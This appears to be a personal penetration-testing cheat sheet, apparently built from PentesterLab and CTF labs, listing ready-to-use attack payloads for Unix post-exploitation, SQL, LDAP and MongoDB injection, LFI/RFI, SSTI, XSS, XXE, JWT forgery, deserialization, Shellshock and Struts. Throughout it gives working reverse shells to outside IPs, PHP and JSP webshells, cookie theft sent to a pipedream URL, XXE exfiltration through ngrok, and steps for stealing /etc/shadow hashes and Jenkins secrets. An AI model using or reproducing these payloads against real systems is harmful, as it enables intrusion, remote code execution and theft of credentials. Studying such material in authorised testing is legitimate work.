# Unix

* ;,||,&& promotes code injection `ping 1010101; cat pass.txt`
* .bash_history contains history (in victims home dir)
* * find /home -name .bash_history
* * find /home -name .bashrc -exec grep -H [key || export] {} \; `For alias`
* * find . -name .\*sh_history
* * find . -name .bash_history -exec grep -A 1 '^passwd or su or sudo' {} \; `find user mistake`
* * tar -zxvf (tgz,tar) -jxvf (tbz)
* * bunzip (file) (.bz2)
* * find processes running `ps -edf`
* * `openssl enc -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz  -out /tmp/backup.tgz.enc` decrypt file with same key `openssl enc -d -aes256 -k P3NT35T3RL48 -in /tmp/backup.tgz.enc -out /tmp/decryp.tgz`
* * find backups `find / -name backup* 2>/dev/null`
* * readable /etc/shadow? decrypt Des | $5$ SHA-256 | $6$ SHA-512 | $1$ MD5CRYPT | $2/a$ Blowfish with john hash
* * find / -name tomcat-(users.xml) 2>/dev/null
* * use mysql -u {user} -p[passw] -> no space
* * mysql passwd `strings /var/lib/mysql/mysql/user.MYD` in mysql acct {merge to similar part to john (username:*3456KSDKFS....{merge lower})}
* * mysql -> select load_file('/var/lib/mysql-files/key.txt'); for older ver
* * psql | \list | \c dbname | \d {show tables} | select stmt {su postgres -> psql}
* * psql {dbname} -U username -W
* * get passwords from configs like db.php etc in /var/www
* * sqlite {dbfile.db} .tables || "select stmt" || .schema (tablename)
* * `sudo -u victim find /home/victim -name key.txt -exec cat {} \;` || `sudo -u victim vim -> ':!/bin/bash'` || `sudo -u victim less :e /path` || `sudo -u victim awk 'BEGIN {system("/bin/sh")}'` || `gcc get.c -o get; sudo -u victim cp get foo;sudo -u victim chmod +xs foo `

```
node -e 
'var exec = require("child_process").exec;
exec("cat /home/victim/key.txt", function (error, stdOut, stdErr) {
console.log(stdOut);
});'
``` 
```    
Read file in postgres
CREATE TABLE demo(t text);
# COPY demo from '[FILENAME]';
# SELECT * FROM demo;   
```
# PHP
* https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet

# Essentials

* modify cookies (md5 decode)
* register ('Admin','admin  ')
* check redirects and mod to 200
* check for IDOR
* check file ext (user/1.json)
* Sql ORM user[admin]=true || 0 || 1 -> add to intercept or inject 
* adding related params as above
* use concats (.,+,;) can find which prog running
* type juggling `username[]=s`
```
Breaking out of PHP
eval()
By adding dummy code: ".system('uname -a'); $dummy=".
By using comment: ".system('uname -a');# or ".system('uname -a');//.

?order=id;}//: we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.
?order=id);}//: we get a warning. That seems about right.
?order=id));}//: we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets.
Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using ?order=id);}system('uname%20-a');// for example.
This challenge is based on a vulnerability in PHPMyAdmin: CVE-2008-4096

preg_replace() until php5.5.0
the pattern is evaluated... so breaking it will result to code exec
`/e`
`?new=phpinfo()&pattern=/lamer/e&base=Hello%20lamer`
?new=system(%27whoami%27)&pattern=/lamer/e&base=Hello%20lamer

assert()
?name=hacker%27.phpinfo().%27
```
/usr/local/bin/score 8960b64a-fb41-40dc-ac1f-ac406dc9a461
L3Vzci9sb2NhbC9iaW4vc2NvcmUgODk2MGI2NGEtZmI0MS00MGRjLWFjMWYtYWM0MDZkYzlhNDYx
```
Breaking out of Ruby
/?username=hacker"%2b`uname`%2b"

test 1.to_s
```

```
Breaking out of Python
/?username=hacker"%2bstr(os.popen("whoami").read())%2b" -> "hacker+str(code)+"

hacker"%2bstr(__import__('os').popen("whoami").read())%2b"

hacker"%2bstr(__import__('os').popen(__import__('base64').b64decode('YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNzIuOTMuMi85MDAxIDA+JjEnCg==')).read())%2b"

test str(1)

eval("__import__('os').system('clear')", {})

//int(eval(variable))
thing = "hi"
int(eval("int.from_bytes(thing.encode(), 'little')"))
# Output: 26984

num = 26984
num.to_bytes((num.bit_length() + 7) // 8, 'little')
```

```
Breaking out of Perl
cgi-bin/hello?name=saide%27.`uname`.%27 -> '.`uname`.'

test 1.to_s
```
## MongoDB
* use ' || 1==1 (%00, //, <!-->)
* /?username=admin' || 1==1%00&password=sd&submit=Submit
* /?search=admin'%20%26%26%20this.password.match(/.*/)%00 (more on hacktricks) (/^a.\*$/ inject)

## Command injection (can be blind so test revshell)
* /?ip=127.0.0.1;inject or /?ip=127.0.0.1 ||, %%, |
* use /?ip=127.0.0.1\`inject\` 
* use /?ip=127.0.0.1$(inject)

## Directory traversal (LFI)
* ./path
* ../file.php?=file.php (check itself)
* /../../../../../../../../../../../
* use null byte %00 to break out of fixed e.g(file='sdsd'.png')
* Check with lfi wordlist (../../../../../etc/apache2/sites-available/000-default.conf)(../../../../var/log/dpkg.log.1)
* ../../../../../../../proc/1/cmdline check for processes running
* /proc/self/environ
* /proc/self/cmdline
* /proc/self/cwd/<predict file>
* ..%ef%bc%8f == ../
* lfi -? php session -> rce 
``` # enumerate (ippsec monitor)
for i in $(seq 0 2000); do echo -n "$i:"; curl urltolfi?url=../../../../../../../proc/$i/cmdline --output -; echo; done
```
## Wrappers
* `?file=data:text/plain,<?php system('inject') ?>`
* `?page=expect://ls`
* `?page=php://filter/resource=/etc/passwd`
* `?page=php://filter/convert.base64-encode/resource=/etc/passwd`
* `?page=zip://path/to/file.zip%23shell` (after uploading a mal zip)

## to shell
* locate logs (use logs list) (mail,ssh,ftp,environ,http,sessions)
* pass `<?php system($_GET['c']); ?> as use ragent or get
* functions (shell_exec,system)


## File include (RFI)
```
<?php 
  system($_GET['c']);
?>
```
here http://assets.pentesterlab.com/test_include_system.txt
* Host ^ for include vuln with ?page=http://host&c=inject
* use null byte %00 to break out of fixed e.g(file='sdsd'.png')

# LDAP
* like a database
* allows NULL bind login (send request without params)
* use bind and search to connect
```
(cn=[INPUT])
If you want to add more conditions and some boolean logic, you can use:

A boolean OR using |: (|(cn=[INPUT1])(cn=[INPUT2])) to get records matching [INPUT1] or [INPUT2].
A boolean AND using &: (&(cn=[INPUT1])(userPassword=[INPUT2])) to get records for which the cn matches [INPUT1] and the password matches [INPUT2].

The end of the current filter using hacker).
An always-true condition ((cn=*) for example)
A ) to keep a valid syntax and close the first (.
A NULL BYTE (%00) to get rid of the end of the filter.

/?name=admin)(cn=*))%00&password=admin
```
* watch ippsec travel

## Open redirects
`website that visits site given to it can be used to steal cookie and headers // XXSHUNTER, Pipeddream//`
* http://vulnwebsite/redirect.php?uri=http://{stealersite}
* http://vulnwebsite/redirect.php?uri=//{stealersite}

# header security
* https://securityheaders.com/

## SQL Injection
" "
* admin' or '1'='1
* admin" or "1"="1
md5("")
* ") OR 1=1 --  ---> add a space at the end
* ") OR ("1"="1
Limit
* admin"/' or 1=1 LIMIT 1 -- 
No Space
* use tab encoding `%09` in request
* `username=admin%27%09or%091-1%09--%09&password=admin`
* use || for OR 
* instead or 1=1 we can use OR 1 // ||1
* `username=admin%27||1%23&password=admin`
With %bf
* Using the string \xBF' (URL-encoded as %bf%27), it's possible to get a single quote that will not get escaped properly. It's therefore possible to inject an always-true condition using %bf%27 or 1=1 -- and bypass the authentication.
* `username=admin%bf%27+or+1=1+--+&password=admin   `

## SSRF
* `/?url=http://127.0.0.1/2/3/4:1234/`
* `/?url=http://localhost:1234/`
* `/?url=http://017700000001:1234/` 
* use a suffix that directs to localhost 
* Bypass using DNS -> localhost `localtest.me = 127.0.0.1`
* `http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/hacker.txt`

## SSTI
* `{{ self._TemplateReference__context.cycler.__init__['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'].os.popen('ls').read() }}`
* {{self}} // check for cycler
* if length check is enabled try use list or tuple
* use [] if . is blocked
* polygot for testing `${{<%[%'"}}%\.` (https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)


## Python
* try with `{{7*7}}` with url if the url is displayed
* try with `{{7*7}}` with form if the form is displayed
finding process to expolit
* try `{{''.__class__}}` --> returns something
* try `{{''.__class__.mro()[0]}}` --> returns something
* try `{{''.__class__.mro()[2].__subclasses__()}}` --> returns lots of something (change the numbers till you find a type with plenty object) (change 2 to 1)
* use vi to number (paste content and use `%s />/\r/g` to order &&  use `set number` %% search for Popen with `/Popen` && get number)
* * or use vs code (find and replace > to \n) to get Popen offset class numberish
* try `{{''.__class__.mro()[2].__subclasses__()[Popen offset by one]}}`
* try `{{''.__class__.mro()[2].__subclasses__()[233]("uname")}}`
* * to using arguments (["uname", "-a"]) || (["uname -a"], shell=True)
* use  `{{''.__class__.mro()[2].__subclasses__()[233](["uname -a"], shell=True, stdout=-1).communicate()[0]}}`
* `%7B%7B''.__class__.mro()[2].__subclasses__()[233](["inject code"],%20shell=True,%20stdout=-1).communicate()[0]%7D%7D`
filter
* {{attr()}}
* {{()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')()}}
* find class `subprocess.Popen` get the number as above
* {{()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')()|attr('__getitem__')(360)("cat flag.txt",shell=True,stdout=-1)|attr('communicate')()}}
## Jinja
* request['application']['__global__']['__builtins__']['__import__']('os')['popen']('cat flag.txt').read()}}
* request.close.__globals__.__builtins__['open']('flag', 'rb').read()|join('-')
## Twig(PHP)
* use `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`

## File Upload
### Method 1
```
<?php
  system($_GET["cmd"]);
?>
```
* Upload webshell -> navigate to loacation/webshell.php?cmd=inject
* rename to php3 and others
* add `<?php echo "<pre>";system($_GET["cmd"]); ?>` as comment in image for upload (rename extention .php)
### Method 2
* Change upload file name to ../../../../../../root/.ssh/authorized_keys
* `ssh-keygen -f user`
* copy user.pub content to upload content
* `chmod 600 user.pub`
* ssh -i user root@IP

## XXE
* `<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]> <used exp> &x; </used exp>`
* XPATH -> /?name=hacker%27%20or%201=1]/parent::*/child::node()%00
* use "file:///var/www/html/" to read files
* use "php://filter/convert.base64-encode/resource=/var/www/html/index.php" to view php files


## XSS
* always inspect page
* test with `document.cookie`
* name=%3CsCRipt%3Ealert(%278960b64a-fb41-40dc-ac1f-ac406dc9a461%27)%3C/sCRipt%3E
* * Bypass filter with sCRipt || <scr<script>ipt>
* * ?name=hacker<scr<script>ipt>alert(%278960b64a-fb41-40dc-ac1f-ac406dc9a461%27)</scr</script>ipt>
* ?name=hacker<a onmouseover='alert(1)'>Test</a>
* ?name=hacker<img src="sdsds" onerror='alert(1)'>Test</img>
* ?name=hacker<script>eval("al"%2b"ert(1)")</script> || hname=hacker%3Cscript%3Eeval(%22al%22%2b%22ert(%27
message%27)%22)%3C/script%3E
* eval(String.fromCharCode(96,108,101,114,116,40,49,41)) --> in decimal rep
* escape script tags in variable
* * <script> var a = "input" </script> -->> ";alert(1);var j=" || ?name=hacker";alert(1);var%20j%20="2 --> Try single quotes
* escape the form in html <form action="/index.php/somethingrando"><script>alert(1)</script><"method="POST">
* * `/index.php/somethingrando"><script>alert(1)</script><`
* * `http://vulnsite/index.php/somethingrando"><script>alert('8960b64a-fb41-40dc-ac1f-ac406dc9a461')</script><`
* uriencoded passed from url `http://vulnsite/index.php#%3Cscript%3Ealert('inject')%3C/script%3E`
*   <script> document.write('<img src="https://8a576325f858b619f886cc7315bec05c.m.pipedream.net/?c='+document.cookie+'" />'); </script>
* steal cookies with pipedream `<script>%20document.write(%27<img%20src="https://8a576325f858b619f886cc7315bec05c.m.pipedream.net/?c=%27%2bdocument.cookie%2b%27"%20/>%27);%20</script>`
* <script> new Image().src="http://hostedsite/?c="+document.cookie;</script>

## PCAPS
* follow tcp/ftp strea,
* for ftp find PASV (passive mode) traverse tcp.stream eq 1
* tcp.port == <port>
* rsh protocol displays raw (follow that!)
* rlogin protocol displays raw (follow that!)
* pop protocol displays raw (follow that!)
* read all email word for word
* when you find a file with being and end (save the begin - end to a file) Use uudecod <file> (sudo apt install sharutils)
* http GET/POST/COOKIE/response text/Basic Auth/Bearer(b64) request
* http chucked (no content lenght)
* http (Connection: keep alive) uses on tcp connection to recevie multiple request
* Dns check query and anser in packet or UDP stream
* Dns (Txt record used to prove you own the domain) in Anwsers
* Dns (dns.id==0) when the id is either incremental or same
* Dns (use the transaction ID for request)to get the same response
* ICMP (check data field)
* TLS (check Server Hello,certificate,server hey exchange, server hello Done) in Certificate field
* TLS (check for sni (server name) in Extentions)
* TLS private key decode (edit->preferences->protocols->TLS->add(0.0.0.0,443,http,/path.key))
* TLS decode TLS_ECDHE_RSA ( add ^ premaster (from backdooring server to save master key))

# CVE-2014-6271/Shellshock

* find /cgi-bin
* inject in `User-Agent: () { :;}; echo $(</etc/passwd`
* `echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80`
* `User-Agent: () { :;}; /usr/bin/nc 192.168.211.129 3000 -e /bin/bash` || `nc -lnvp 3000`
* `User-Agent: () { :;}; /bin/bash -c "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.10.115 1235 >/tmp/g"`
* `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.90.35/9999 0>&1' http://192.168.90.59/cgi-bin/test.sh`

# JSON Web Token ( JWT )
* jwt
* uses signature (header, data, signature)
* use burp suite  decoder to decode auth cookie `{"alg":"None","typ":"JWS"}.{"login":"admin","iat":"1628019584"}.` use none for decode back (b64header.b64data.)
* try changing the data0                              or nOne || noNe

# Sql injection

* `name=ipp' union select 1 -- -` (increase 1,1,1,1 until no error) ()
* `name=ipp' union select schema_name from information_schema.schemata -- -`
* `name=ipp' union select group_concat(schema_name) from information_schema.schemata -- -` (get dbname)
* `name=ipp' union select group_concat(table_name, ":", colum_name, "\n") from information_schema.columns where table_schema like 'dbname'-- -`
* `name=ipp' union select group_concat(actualtable, "\n") from actualdb -- -`
* `name=ipp' union select LOAD_FILE('/path/to/file') -- -`
* `name=ipp' union select 1,2,"<?php system($_GET['cmd']); ?>" INTO OUTFILE '/path/to/file' -- -`


# From SQL Injection to Shell
* find breaking point with (',",)
* in case id param is injectable (id=2 and 1=1) for confirmation
* ?id=2 union select 1,2,3.... until no error to find the number of columns
* OR with (order by) ?id=2 order by 10 (tip is to start high and divide until you find the sweet spot)
* to get version use ?id=2 union select 1,@@version,3,4 (in the result)
* to get user use id=2 union select 1,user(),3,4
* to get database use id=2 union select 1,database(),3,4
* to get tables use id=2 union select 1,table_name,3,4 from information_schema.tables
* to get tables columns use id=2 union select 1,column_name,3,4 from information_schema.columns
* use id=2 union select 1,login,3,4 from users (guess the column and table)
* use id=2 union select 1,password,3,4 from users (guess the column and table)
* use id=2 union select 1,concat(login,':',password),3,4 from users (guess the column and table)
* get access and upload a webshell (.php3,.php4....)

* %"; UNION SELECT 1,1,1,1,1 from USERS WHERE NAME LIKE "%

# CVE-2007-1860: mod_jk double-decoding (tomcat)

* Apache server -> tomcat server
* mod_jk : mod_jk is an Apache module used to connect the Tomcat servlet container with web servers such as Apache, iPlanet, Sun ONE and even IIS using the Apache JServ Protocol. A web server waits for client HTTP requests
* check /manager/html on apache and tomcat server || /manager/html/list
* (../) encode the encoded version of %2e => (.) to %252e%252e/manager/html
* * another way is `..;/` or `;../` try! when ngix blocks
* * `/workingdir;name=orange/manager/html` or `/manager/DoesNotExist/..;/html`
* try tomcat:admin:nopass brute force
* deploy WAR webshell (tools/webshell.war)
* if upload error (modifiy post method = %252e%252e/manager/html)
* navigate to the webshell on dashboard (onerror add examples/%252e%252e/webshell) for < tomcat7
* for tomcat7>
* add to post method action (/examples/%252e%252e/manager/html/upload?) 
* when the post method is modified check the response set cookie path=/manager/ (remove /manager) to set cookie everwhere may need to do multiple times (401 error because not auth basic and 403 because no session provided)
* on successfull upload nagivate to /examples/%252e%252e/webshell/



## Building a Webshell
To build a Webshell, we will need to write the Webshell and package it as a war file. To write the Webshell, we can either use JSP or Servlet. To keep things simple, we are going to build a JSP Webshell, the following code can be used:
```
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```
`We can now create a directory name webshell and put our file (index.jsp) inside it:`
```
$ mkdir webshell
$ cp index.jsp webshell
```
`Now we can build the war file using jar (provide with java):`
```
$ cd webshell
$ jar -cvf ../webshell.war *
added manifest
adding: index.jsp(in = 579) (out= 351)(deflated 39%)
```
Our Webshell (webshell.war) is now packaged and we can upload it using the Tomcat Manager.

## OR use msf

* `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.46 LPORT=4444 -f war > shell50.war`

# Pickle Code execution (python deserialization)
* (check the b64 decoded version of session and cookie for serialized version)
```
(lp1
Vdemo
p2
aS'e210fbdb7d71862df3abce43b4b69baa'
p3
YS4
```
* use remember me feature to create user (for trigger)
* payload (tools/pickle.py)
* replace b64 output in the remeberer me field
* refresh browser then delete session then refresh browser
* if 500, good feedback

# json pickle (python)

* `{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 192.168.0.25 5555"], 0, 0, 0]}`

# Electronic code book
* decode the auth token/cookie
* get the size by creating a long username with like 16 a's and check the hex value to see size (look for repeating)
* create a username with the size plus the target e.g size 8 bytes (aaaaaaaaadmin)
* remove the first 8 bytes then use the encode back then replace cookie

# XMLDecoder
* tools/XMLDecoder*
* exploit the sign and <verify> functionality with java

# CVE-2016-0792 (Jenkins) (Xstream)

* create new item 
* capture createItem request
* add ?name=random
* content-type: text/xml
* add the payload (tools/cve-2016-0792-jenkins)
* if 500, good feedback
* https://github.com/gquere/pwn_jenkins

# Jenkins reverse shell

* create new item
* * if you can't build add build trigger `* * * * *`
* * or use remote trigger and (dashboard ->configure api token)
* * curl http://admin1:116da9254427bd6bcaba162bef8e5e74a4@object.htb:8080/job/test3/build?token=test 
* windows -> windows batch
* linux -> exec shell
## Getting Secrets
* `type c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml` -> credentials.xml
* `cmd.exe /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key"` -> master.key
* `powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c"` -> `echo 'gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=' | base64 -d > hudson.util.Secret` -> hudson.util.Secret
* decryptor -> `https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py` 
* https://github.com/gquere/pwn_jenkins

# Object input stream (java serialize object)
* decode the auth token/cookie 
* if it starts with "rO0ABXNyAA92dWx" or hex 664 decode value is "ac ed 00"
* (tools/ysoserial) tryall options Spring1 used below
* `java -jar ysoserial-0.0.4.jar Spring1 '/usr/bin/nc -l -p 9999 -e /bin/sh' | base64` (try to reduce the words)
* replace the encoded value with the auth token/cookie and send request


# Rails Object Injection CVE-2013-0156
* exploitation of a code execution in Ruby-on-Rails using XML and YAML
* tools/rails_rce.rb
* used docker 
* * on the win (cmd)-> `docker run -it ruby:2 /bin/bash`
* * curl https://gist.githubusercontent.com/postmodern/4499206/raw/a68d6ff8c1f9570a09365036aeb96f6a9fff7121/rails_rce.rb -o rails_rce.rb
* * ruby URL '`cmd inject`' 


# API to shell

* use -x IP:PORT to send through burp
* loose comparison (("a" == 0) ("1' or 1=1" == 1) ("<script>alert(1)</script>" == 0) var_dump("1" == 1)) but `===` is strict!
* signature bypass if (the api is comparing strings like (uuid: "randoms", sig: 0))
* try adding stings until the hash = 0 
```
{ "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtzOjE6IjIiO3M6NToibG9naW4iO3M6NzoiZGR6cWhraiI7fQ%3D%3D--825ead97e6d85acde9fc64eaa27a9aa5", "uuid": "../../../../../../etc/passwd", "sig": 0}
```
* read source code
## PHP serialize 
* call the object that don't have a varible used
```
<?php
define('KEY', "ooghie1Z Fae8aish OhT3fie6 Gae2aiza");

function sign($data){
    return hash_hmac('md5', $data, KEY);

}

function tokenize($user){
    $token = urlencode(base64_encode(serialize($user)));
    $token.="--".sign($token);
    return $token;
}

class File {
    public $owner,$uuid= '<?php system($_GET["c"]); ?>';
    public $logfile = "/var/www/x.php";
}

echo tokenize(new File());

?>
```

# PHP Mailer RCE

* add `"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php  root"@127.0.0.1` to the from field 
* that creates the shell.php file
* add `<?php system($_GET["c"]); ?>` to the subject field
* anthing in the body
* navigate to the shell.php?c=`inject`
*ignore error message

# CVE-2016-2098 (ruby render vuln)

* when the params loads a page (?id=test) = (render params[:id])
* exploit {inline => '<%=`inject` %>'}
* id=test
* exploit ?id[inline]=<%25%3D%60inject%60%25>

# Chiper block chaining

* XOR The first byte of the decoded auth(b64) 
* use ruby `sudo docker run -it ruby:2 /bin/bash` to change the first byte then enter interactive shell `irb`
* `0xcc^'a'.ord^'b'.ord` => a is the letter to be chaned and b is the subtitue (cdmin) 
* get the decimal and change to hex `"%2x" % 206`
* replace the output and encode to b64
* replace the encoded in auth request

# Play session injection 

* (signature-%00key: value%00) 
* Find PLAY_SESSION cookie in intercept
* Test by adding a `%00` to one of the field to check for filtering (look at the response)
* inject another column like `username=test2%00%00admin:1%00`
* use the set-cookie response and pass to a request like index
* also can hijack users with `username=test2%00%00admin:1%00%00user:admin1%00`

# Play XML entities
* PLAY_FLASH cookie to identify
* capture a request like failed login attempt
* Change content-type: text/xml 
```
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "publiceserver/test.dtd">
<foo>&e1;</foo>
```
* test.dtd
```
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://4b2c92c82155.ngrok.io/BLAH?%p1;'>">
%p2;
```
* check server logs for leaks
* change `file:///etc/passwd` to `file:///user/dir` in test.dtd
 
## Create a public facing server
* python3 -m http.server 4444
* ./ngrok http 4444

# JWT Web token II (rs256)

* get auth cookie (usualy starts with 'ey')
* decode header to b64  change algo from RS256 to HS256 and encode back
* change user to admin
* get the public key
* use `tools/hs256-jwt.py` to get new auth cookie then replace

# Struts s2-045
* Struts 2.3.5
* Struts 2.3.31
* Struts 2.5
* Struts 2.5.10
* try different pages including root
* use payload as Content-Type: payload (before=> Connection: close)
```
%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
## Detection
```
%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}
```

# Struts s2-052
* Struts 2.1.2 to 2.3.33 (inclusive)
* Struts 2.5 to 2.5.12 (inclusive)

* Send as POST and  `Content-Type: application/xml` and data as (tools/s2-052)

# JWT Web token III (with kid)
* get auth cookie (usualy starts with 'ey') and decode to b64

# JWT Web token III (modify user)
* get auth cookie (usualy starts with 'ey') and decode to b64
* decode payload to b64 change user to admin and encode back

# Git information leak

* wget -r `http://vuln/.git
* git status
* git git diff
* cd vulfile/.git

* git log
* git show <commit id>

# Git hook 
* when a cronjob auto commits or auto /stuff
* cd .git/hooks
* create `pre-commit` with reverse shell starting with `#!/bin/bash` -> make executable
* wait for next run

# Git commit FSmonitor RCE
* git init
* echo 'fsmonitor = "<inject> > /tmp/rce"' >> .git/config
* git status -> runs command
 

# JWT web token weak trival key (hashcat)

* save auth to file
* add name of the company/related stuff to enrich dict
* use on dict `hashcat --stdout example.dict -r rules/base64.rule | hashcat -m 16500 jwt`
* or just wingit `hashcat -m 16500 jwt example.dict`
* with secret use `jwt.io` to sign

# JWT Sql injection with sqlmap / sign cookie with secret from SSTI
* get cookie from like {{config}}
* pip3 install flask-unsign
* flash-unsign --decode --cookie 'jwtcookiehere'
* add bad char or test sql with decoded value
* flash-unsign --sign --cookie 'same decoded with new payload' --secret
* sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump ===> don't merge cookie


# # Git information leak II
* use ./git/config || .git/HEAD  to test
* go to .git/refs/heads/master => hash
* go to .git/objects/ha/sh e.g (.git/objects/cb/6cd1e2e905ae1f9c163128e036c8e7806214c5)
* mkdir new && git init `mkdir .git/objects/cb && curl http://ptl-3c543f55-f0386e1f.libcurl.so/.git/objects/cb/6cd1e2e905ae1f9c163128e036c8e7806214c5 -o .git/objects/cd/6cd1e2e905ae1f9c163128e036c8e7806214c5`
* `git cat-file -p cb6cd1e2e905ae1f9c163128e036c8e7806214c5` => hash
* repeat with new hash e.g (`mkdir .git/objects/58 && curl http://ptl-3c543f55-f0386e1f.libcurl.so/.git/objects/58/ace0476093d04023f84d7816adacfa7b879c43 -o .git/objects/58/ace0476093d04023f84d7816adacfa7b879c43`)
* reveal path `git cat-file -p new hash` 
* repeat as needed

# JWT web token (RCE in kid) 

* use tools/kid-jwt.py
* replace the kid field with "kid": "|command" (the pipe is extremly important)
* replace the key as random 

# JWT web token (SQL injection in kid) 

* use tools/kid-jwt.py
* replace the kid field with "kid": "zzzzzzzzz' union select'aaa"
* replace the key as aaa 

# CBC-MAC 
* assuming its split in 8 bytes (tools/CBC-exploit.rb)

# CBC-MAC  (with iv)
* get iv and auth in request then plug in (tools/CBC-exploit0iv.rb)

# CVE-2018-0114 (jwk self signing)
* trust keys embeded in header
* not classic jwt with first header as RS256 with kid "." encoded username
* (tools/cve-2018-0114-jwk.rb)


# GraphQL Introspection
* get graphql request e.g
```
{"operationName":"projects","variables":{"offset":10},"query":"query projects($offset: Int) {\n  projects(offset: $offset, limit: 10) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"}
```
* replace query value with (tools/graphlgl-introspection.md) try both values
* leave only query object and send
* get object name and field names
* use names with original request

# Ruby 2.x Universal RCE Deserialization Gadget Chain (Marshal.load)
* with site that uses the marshall.load() with base64
* run (tools/ruby-2.x-universal-RCE-deserialization-gadget-chain.rb) copy b64 to form 

# GraphQL: SQL Injection
* use introspection above
* replace
```
"query":"query projects($offset: Int) {\n  projects(offset: $offset, limit: 10) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"
```
with
```
"query":"query project($id: ID!) {\n  project(id: $id) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"
``` 
`Remember the type`
* Change the variables like ("id":"id") to ("id":"1")
* try to break ("id":"1'") to test sql
* now inject 
```
{"operationName":"project","variables":{"id":"-1 union select id,value,3 from ptlabIIkey"},"query":"query project($id: ID!) {\n  project(id: $id) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"}
```

# CVE-2019-5420 (ruby development enviroment session) (json)
* Find name of the app
* (tools/cve-2019-5420-dev-env-ruby.rb)

# CVE-2019-5420 II (ruby development enviroment session)  (marshall)
* Find name of the app
* (tools/cve-2019-5420-ii-dev-env-ruby.rb)
* get signed token
* decrypt for test
* (tools/cve-2019-5420-dev-env-ruby.rb) => with ruby rce 2.x
* result as new token => error means successful code execution


# From SQL Injection to Shell III (mfa bypass) (image tragicK RCE)
